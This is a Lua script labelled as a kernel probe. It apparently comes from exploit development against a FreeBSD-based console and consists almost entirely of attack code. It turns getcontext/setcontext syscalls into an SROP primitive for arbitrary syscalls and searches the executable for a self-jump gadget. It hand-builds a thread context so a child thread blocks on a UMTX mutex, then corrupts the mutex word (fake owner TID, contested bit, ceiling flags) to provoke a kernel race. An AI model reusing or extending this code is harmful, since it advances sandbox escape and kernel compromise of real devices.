-- CRASH_CLASS: MODERATE
-- PROBE 185a: UMTX mutex race with threaded waiter
--
-- We have: UMTX_OP_MUTEX_LOCK (op 5), MUTEX_UNLOCK (op 6), threading.
-- Plan: main thread locks mutex, child thread blocks on same mutex,
-- main thread corrupts mutex word then unlocks. Observe kernel behavior.
--
-- The child thread calls umtx_op(addr, 5, 0, 0, 0) directly via syscall.
-- When the mutex is held, the child blocks in the kernel.
-- We then test: owner TID confusion, flag manipulation, address corruption.

print("=== 185a: UMTX MUTEX RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex64(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer (large, for mutex + stacks + contexts)
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Find eboot base for gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
local eb_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("eboot=" .. hex64(eb_base))

-- Search for EB FE (jmp $) in eboot .text
local jmp_self = nil
for off = 0, 0x100000, 2 do
    local ok, b = pcall(function() return memory.read_byte(eb_base + off) end)
    if not ok then break end
    if to_num(b) == 0xEB then
        local ok2, b2 = pcall(function() return memory.read_byte(eb_base + off + 1) end)
        if ok2 and to_num(b2) == 0xFE then
            jmp_self = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("jmp_self=" .. hex64(jmp_self) .. " (offset 0x" .. string.format("%X", off) .. ")")
            break
        end
    end
end
if not jmp_self then
    print("NO JMP SELF FOUND - trying ret-loop approach")
    jmp_self = sc_addr  -- fallback: will re-enter syscall (harmless with wrong regs)
end

-- Get main thread's TID
local tid_buf = memory.alloc(8)
local rv = srop(432, uint64(tid_buf), uint64(0), uint64(0))  -- thr_self
local main_tid = rd(tid_buf)
print("main_tid=" .. string.format("0x%X", main_tid))

-- === SECTION A: Basic mutex lock/unlock via SROP ===
print("")
print("--- A: BASIC MUTEX ---")
local MTX = 0x10000  -- mutex word at gpu + MTX
wd(gpu + MTX, 0)     -- unlocked state

-- umtx_op(addr, UMTX_OP_MUTEX_LOCK=5, 0, NULL, NULL)
-- syscall 454
rv = srop(454, ga(MTX), uint64(5), uint64(0), uint64(0), uint64(0))
local lock_ret = rv and to_num(rv) or -999
print("MUTEX_LOCK=" .. lock_ret)
local mtx_val = rd(gpu + MTX)
print("mutex_word=0x" .. string.format("%X", mtx_val))

if lock_ret ~= 0 then
    print("MUTEX_LOCK FAILED - trying with umtx_key")
    -- Try with value in mutex word set to 0
    wd(gpu + MTX, 0)
    rv = srop(454, ga(MTX), uint64(5), uint64(0), uint64(0), uint64(0))
    lock_ret = rv and to_num(rv) or -999
    print("MUTEX_LOCK(retry)=" .. lock_ret)
    mtx_val = rd(gpu + MTX)
    print("mutex_word=0x" .. string.format("%X", mtx_val))
end

-- Unlock test
rv = srop(454, ga(MTX), uint64(6), uint64(0), uint64(0), uint64(0))
local unlock_ret = rv and to_num(rv) or -999
print("MUTEX_UNLOCK=" .. unlock_ret)
local mtx_val2 = rd(gpu + MTX)
print("mutex_word_after=0x" .. string.format("%X", mtx_val2))

-- === SECTION B: Spawn blocking child thread ===
print("")
print("--- B: CHILD THREAD SETUP ---")

-- Allocate child's stack (4 pages)
local CHILD_STACK_BASE = 0x20000
local CHILD_STACK_SIZE = 0x4000
local CHILD_STACK_TOP = CHILD_STACK_BASE + CHILD_STACK_SIZE - 0x100
-- Fill stack with a pattern
for i = 0, CHILD_STACK_SIZE - 1, 8 do
    wq(gpu + CHILD_STACK_BASE + i, uint64(0))
end
-- Put jmp_self address at [RSP] so ret goes to infinite loop
wq(gpu + CHILD_STACK_TOP, jmp_self)

-- Lock the mutex so child will block
wd(gpu + MTX, 0)
rv = srop(454, ga(MTX), uint64(5), uint64(0), uint64(0), uint64(0))
print("lock_before_child=" .. (rv and to_num(rv) or -999))
print("mutex_word=0x" .. string.format("%X", rd(gpu + MTX)))

-- Marker for child thread
local CHILD_MARKER = 0x30000
wd(gpu + CHILD_MARKER, 0)  -- child will never write here (it blocks in kernel)

-- Build thr_create context (0x500 bytes)
local TCTX = 0x18000
for i = 0, 0x4FF, 8 do wq(gpu + TCTX + i, uint64(0)) end

-- Gates
wq(gpu + TCTX + 0x108, uint64(0x480))    -- magic
wd(gpu + TCTX + 0x0D0, 0)                 -- flags (<=7)
wq(gpu + TCTX + 0x110, uint64(0x10000))   -- type

-- Segment registers
wd(gpu + TCTX + 0x0C0, 0x43)              -- CS
wd(gpu + TCTX + 0x100, 0x3B)              -- SS

-- Entry point: syscall; ret (child calls umtx_op)
wq(gpu + TCTX + 0x0E0, sc_addr)           -- RIP = syscall instruction

-- Stack
wq(gpu + TCTX + 0x0F8, ga(CHILD_STACK_TOP))  -- RSP

-- GP registers for umtx_op(mutex_addr, MUTEX_LOCK=5, 0, 0, 0)
-- +0x048 = RDI = mutex address
wq(gpu + TCTX + 0x048, ga(MTX))
-- +0x050 = RSI = op = 5 (MUTEX_LOCK)
wq(gpu + TCTX + 0x050, uint64(5))
-- +0x058 = RDX = 0
wq(gpu + TCTX + 0x058, uint64(0))
-- +0x060 = RCX = 0 (not used directly but R10 is arg4)
wq(gpu + TCTX + 0x060, uint64(0))
-- +0x078 = RAX = 454 (umtx_op syscall number)
wq(gpu + TCTX + 0x078, uint64(454))
-- +0x090 = R10 = 0 (uaddr2)
wq(gpu + TCTX + 0x090, uint64(0))
-- +0x068 = R8 = 0 (uaddr3)
wq(gpu + TCTX + 0x068, uint64(0))

-- Create child thread
local child_tid_ptr = memory.alloc(8)
wd(child_tid_ptr, 0)
rv = srop(430, ga(TCTX), uint64(child_tid_ptr))
local create_ret = rv and to_num(rv) or -999
local child_tid = rd(child_tid_ptr)
print("thr_create=" .. create_ret .. " tid=0x" .. string.format("%X", child_tid))

-- Check if child is alive
if child_tid > 0 then
    rv = srop(431, uint64(child_tid), uint64(0))  -- thr_kill(tid, 0)
    print("thr_kill(0)=" .. (rv and to_num(rv) or -999))
end

-- Brief wait for child to enter kernel (blocking on mutex)
-- Use nanosleep(50ms)
local TS = 0x15000
wq(gpu + TS, uint64(0))        -- tv_sec = 0
wq(gpu + TS + 8, uint64(50000000))  -- tv_nsec = 50ms
srop(240, ga(TS), uint64(0))   -- nanosleep

print("after_sleep mutex_word=0x" .. string.format("%X", rd(gpu + MTX)))

-- === SECTION C: RACE - Corrupt mutex word while child is blocked ===
print("")
print("--- C: MUTEX CORRUPTION TESTS ---")

-- Test C1: Change owner TID to 0xDEAD
local orig_mtx = rd(gpu + MTX)
print("C1: orig=0x" .. string.format("%X", orig_mtx))
wd(gpu + MTX, 0xDEAD)
print("  wrote 0xDEAD")

-- Unlock with corrupted owner
rv = srop(454, ga(MTX), uint64(6), uint64(0), uint64(0), uint64(0))
print("  unlock_corrupted=" .. (rv and to_num(rv) or -999))
print("  mutex_after=0x" .. string.format("%X", rd(gpu + MTX)))

-- Brief wait
srop(240, ga(TS), uint64(0))

-- Check child state
if child_tid > 0 then
    rv = srop(431, uint64(child_tid), uint64(0))
    print("  child_alive=" .. (rv and to_num(rv) or -999))
end

-- Test C2: Lock again, let child re-block, set CONTESTED bit
print("")
print("C2: CONTESTED bit test")
wd(gpu + MTX, 0)
rv = srop(454, ga(MTX), uint64(5), uint64(0), uint64(0), uint64(0))
print("  relock=" .. (rv and to_num(rv) or -999))
print("  mutex=0x" .. string.format("%X", rd(gpu + MTX)))

-- Set UMTX_CONTESTED bit (0x80000000)
local cur = rd(gpu + MTX)
wd(gpu + MTX, cur + 0x80000000)  -- set bit 31
print("  contested=0x" .. string.format("%X", rd(gpu + MTX)))

-- Unlock with contested bit
rv = srop(454, ga(MTX), uint64(6), uint64(0), uint64(0), uint64(0))
print("  unlock=" .. (rv and to_num(rv) or -999))
print("  after=0x" .. string.format("%X", rd(gpu + MTX)))

-- Test C3: Try UMTX_OP_MUTEX_WAIT (op 22) and MUTEX_WAKE (op 23/24)
print("")
print("C3: PI operations")
-- UMTX_OP_MUTEX_TRYLOCK = 4
wd(gpu + MTX, 0)
rv = srop(454, ga(MTX), uint64(4), uint64(0), uint64(0), uint64(0))
print("  trylock=" .. (rv and to_num(rv) or -999))
print("  mutex=0x" .. string.format("%X", rd(gpu + MTX)))

-- UMTX_OP_MUTEX_WAIT = 22 (PP mutex wait)
rv = srop(454, ga(MTX), uint64(22), uint64(0), uint64(0), uint64(0))
print("  mutex_wait(22)=" .. (rv and to_num(rv) or -999))

-- UMTX_OP_MUTEX_WAKE = 23
rv = srop(454, ga(MTX), uint64(23), uint64(0), uint64(0), uint64(0))
print("  mutex_wake(23)=" .. (rv and to_num(rv) or -999))

-- UMTX_OP_MUTEX_WAKE2 = 24
rv = srop(454, ga(MTX), uint64(24), uint64(0), uint64(0), uint64(0))
print("  mutex_wake2(24)=" .. (rv and to_num(rv) or -999))

-- Test C4: Try with PI flag in mutex word
print("")
print("C4: Priority Inheritance flag")
-- UMTX_PRIO_INHERIT = 0x01 (flag in mutex word)
wd(gpu + MTX, 0)
rv = srop(454, ga(MTX), uint64(5), uint64(0), uint64(0), uint64(0))
print("  lock(clean)=" .. (rv and to_num(rv) or -999))
print("  mutex=0x" .. string.format("%X", rd(gpu + MTX)))

rv = srop(454, ga(MTX), uint64(6), uint64(0), uint64(0), uint64(0))
print("  unlock=" .. (rv and to_num(rv) or -999))

-- Try lock with PI ceiling value
-- In FreeBSD, umtx PI uses the ceiling in the upper bits
wd(gpu + MTX, 0x00400000)  -- ceiling priority
rv = srop(454, ga(MTX), uint64(5), uint64(0), uint64(0), uint64(0))
print("  lock(ceiling)=" .. (rv and to_num(rv) or -999))
print("  mutex=0x" .. string.format("%X", rd(gpu + MTX)))

-- === SECTION D: UMTX_OP_ROBUST_LISTS ===
print("")
print("--- D: ROBUST LIST ---")
-- UMTX_OP_SET_ROBUST_LIST = 25 (some FreeBSD) or different
-- Note: the real op number might differ
rv = srop(454, ga(MTX), uint64(25), uint64(0), uint64(0), uint64(0))
print("op25(ROBUST?)=" .. (rv and to_num(rv) or -999))

rv = srop(454, ga(MTX), uint64(26), uint64(0), uint64(0), uint64(0))
print("op26=" .. (rv and to_num(rv) or -999))

-- Try higher ops
for op = 27, 30 do
    rv = srop(454, ga(MTX), uint64(op), uint64(0), uint64(0), uint64(0))
    local r = rv and to_num(rv) or -999
    if r ~= -999 then
        print("op" .. op .. "=" .. r)
    end
end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
